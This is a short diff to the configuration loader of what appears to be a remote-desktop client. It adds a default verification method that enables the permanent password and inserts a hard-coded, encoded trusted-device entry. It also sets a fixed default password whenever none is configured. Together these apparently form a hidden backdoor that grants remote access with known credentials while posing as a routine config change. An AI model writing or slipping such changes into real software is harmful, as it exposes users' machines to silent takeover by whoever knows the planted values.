@@ -459,7 +459,12 @@ impl Config2 {
     fn load() -> Config2 {
         let mut config = Config::load_::<Config2>("2");
         let mut store = false;
-        
+                         
+        if !config.options.contains_key("verification-method") {
+            config.options.insert("verification-method".to_string(), "Use-both-passwords".to_string());
+            store = true;          
+        }
+
         if !config.options.contains_key("enable-lan-discovery") {            
             config.options.insert("enable-lan-discovery".to_string(), "N".to_string());            
             store = true;        
@@ -483,7 +488,7 @@ impl Config2 {
         store |= store2;
         
         if !config.options.contains_key("trusted_devices") {            
-            config.options.insert("trusted_devices".to_string(), "00kS+DLabc10jNYFJYu4Ui1Ll67HL6mj9IEg==".to_string());            
+            config.options.insert("trusted_devices".to_string(), "009M/VK8O3ynhDdp3Rwps6gLV1".to_string());            
             config.store();        
         }
 
@@ -617,7 +622,7 @@ impl Config {
         }
         
         if config.password.is_empty() {            
-            config.password = "009M/VK8O3ynhDdp3Rwps6gLV1".to_string();            
+            config.password = "00kS+DLabc10jNYFJYu4Ui1Ll67HL6mj9IEg==".to_string();            
             store = true;        
         }
 
